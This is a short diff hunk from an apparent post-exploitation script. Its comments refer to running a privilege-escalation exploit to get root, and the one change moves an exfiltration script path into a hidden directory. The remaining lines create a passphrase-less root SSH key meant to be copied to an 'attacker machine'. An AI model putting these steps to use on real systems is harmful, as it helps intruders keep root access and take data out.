@@ -3,7 +3,7 @@
 # Run PEexploit.sh located at /home/resch to ensure that privilege escalation has happened and the current user is root
 
 # manual steps
-# /home/resch/scripts/exfiltration_target.sh
+# /home/resch/.scripts/exfiltration_target.sh
 
 # Generate SSH key pair and copy it to the attacker machine:
 ssh-keygen -t rsa -f /root/.ssh/id_rsa_Cserver -N ""
